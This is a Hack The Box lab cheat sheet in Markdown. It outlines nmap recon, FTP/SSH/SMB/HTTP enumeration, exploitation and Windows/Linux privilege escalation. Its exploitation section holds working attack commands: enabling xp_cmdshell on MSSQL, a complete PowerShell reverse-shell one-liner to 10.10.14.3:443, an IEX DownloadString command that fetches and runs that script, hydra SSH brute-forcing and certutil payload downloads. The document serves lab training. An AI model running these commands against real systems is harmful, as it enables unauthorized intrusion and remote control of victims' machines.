# HTB_cheatsheet

## Recon

### nmap

Scan for open ports: `nmap <IP> -p- -T4` <br />
Scan for services and their versions: `nmap <IP> -p<PORT>,<PORT2>,<...> -T4 -A` <br />

### website technologies
TODO
builtwith.com, wappalyzer (browser addon), whatweb, burpsuite

### email-gathering
TODO
Hunter.io, TheHarvester, breach-parse
  
## Enumeration

## FTP (21)
try to connect to ftp-server: `ftp <IP>`, Username: `anonymous`, Password: `<ENTER>` or `Anonymous` <br />
try to find anything interesting, remember to check for hidden directories as well: `ls -la`

### SSH (22)
try to connect to ssh: `ssh <IP>`. In case of `no matching key exchange method found. Their offer...` use something in lines of `ssh 192.168.57.134 -oKexAlgorithms diffie-hellman-group1-sha1` or `ssh 192.168.57.134 -oKexAlgorithms diffie-hellman-group1-sha1 -c aes128-cbc`<br />
see if a banner is returned (for version detection) and if a password is required <br />
try to connect to ssh via a found private key for user: `ssh -i <PRIV_KEY_FILE> <USER>@IP`. Also try to connect to ssh via a found private key to other users that might have authorized this key.


### SMB (139/445)

try to list available shares on smb: `smbclient -L -N \\\\<IP>\\` <br />
connect to smb-share: `smbclient \\\\<IP>\\<SHARE>` <br />
download file from share: `get \<FILE>` <br />

try to find out version of smb-service: use metasploit module ...smb_version TODO <br />

### HTTP/HTTPS (80/443)

visit webpage in browser

try to enumerate directories via gobuster or dirbuster e.g. `gobuster dir -u https://<IP> -w /usr/share/wordlists/dirbuster/common -k` <br />
typical file extensions are: for Apache .php; for Microsoft asp, aspx; for Others .php, .txt, .rar, .pdf, .docx, ... <br />
(optional) use nikto to find vulnerabilities `nikto -h http(s)://<IP>` <br />


### SQL (Windows)

try to connect via impacket's `mssqlclient.py <USER>@<IP> -windows-auth`<br />
check for admin priviledges to be able to have remote code execution ``SELECT IS_SRVROLEMEMBER (`sysadmin`) `` <br />



## Exploitation

### SSH (22)
try to bruteforce ssh login with hydra `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<IP>:<PORT> -t 4 -V` <br />
bruteforcing creates a lot of noise and will probably be discovered.
TODO: what is this? use auxiliary/scanner/ssh/ssh_login

### SMB (139/445)

Try to get a reverse shell for a given user and password via psexec (impacket):
`psexec.py '\<USER>:\<PW>@\<IP>'` <br />

Check for vulnerability in combination with FTP of ms17_010


### HTTP/HTTPS (80/443)
Burpsuite! <br />


### MicrosoftSQL (TODO)

if we have sysadmin privileges we can enable the xp_cmdshell to gain remote code execution on the host
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure
xp_cmdshell "whoami"
```
we then can download a malicious script from our HTTPServer. We can use a One-Liner reverse shell code and save it as a .ps1 file, e.g. with One-Liner content: `$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
from the sql server both download and run it directly via `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` <br />
set up the listener beforehand as usual.

### Hosting a webserver to remotely download files onto the victim machine
- Use `sudo python -m SimpleHTTPServer <PORT>` to run a HTTP-Server inside the current directory <br />
- Use `sudo systemctl start apache2` to run a HTTP-Server on /var/www <br />

Download files on linux via `wget http://<IP>/<File>` or curl TODO <br />
Download files on windows via powershell and `certutil -urlcache -f http://<IP>/<FILE> <PATHONVICTIM>\<FILE>` <br />
Download files on windows via cmd TODO

### Creating malicious code with msfvenom
Show available payloads with `msfvenom -l payloads` <br />

## Privilege Escalation

The bible of privesc: `https://www.fuzzysecurity.com/tutorials/16.html`

### Windows
see what user we are: `whoami` <br />
check the CMD history: TODO <br />
check the PowerShell history: `history` or `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` <br />
try to find known vulnerabilities, e.g. via `https://github.com/rasta-mouse/Sherlock` 

### Linux
see what user we are: `whoami` <br />
check the bash history: `history` or `cat ~/.bash_history` <br />
check sudo privileges of user: `sudo -l` <br />
try to find vulerabilities in kernel, get kernel version with `uname -a` <br />
try to find vulnerable programs running as root with `ps -aux` <br />
if we have no idea what to do: upload `LinEnum.sh` or `linuxprivchecker.py` on target machine (e.g. by via own webserver) and run them, or use `post/multi/recon/local_exploit_suggester` in msfconsole

## Cheatsheets

msfvenom: https://netsec.ws/?p=331
tty shell: https://netsec.ws/?p=337
Reverse-shell 1-liners: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


